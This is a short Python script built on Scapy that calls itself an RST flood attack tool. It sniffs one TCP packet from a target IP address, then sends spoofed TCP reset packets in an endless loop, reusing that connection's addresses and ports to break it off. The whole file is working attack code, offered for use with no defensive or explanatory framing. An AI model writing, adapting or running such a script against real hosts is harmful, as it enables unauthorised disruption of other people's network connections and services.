from scapy.all import *
import argparse
import time

def parseArgs():
	parser = argparse.ArgumentParser(description="Execute RST Flood attack on target IP address")
	parser.add_argument("target_ip", type=str, help="Target IP address to flood communcations with RST packets")

	return parser.parse_args()


def spoof(src_ip, dst_ip, src_port, dst_port):
	IP_Header = IP(src=src_ip, dst=dst_ip)
	print("src_port: " + str(src_port) + "    dst_port: " + str(dst_port))
	TCP_Header = TCP(sport=src_port, dport=dst_port, flags="R")
	payload = "yada yada yada"

	spoofed_packet = IP_Header / TCP_Header / payload
	while True:
		send(spoofed_packet)
		time.sleep(0.25)

def listen(packet):
	ip = packet[0][1]
	tcp = packet[0][1][1]
	
	spoof(ip.src, ip.dst, tcp.sport, tcp.dport)


if __name__ == '__main__':
	args = parseArgs()

	sniff(filter="tcp and src %s" % args.target_ip, count=1, prn=listen)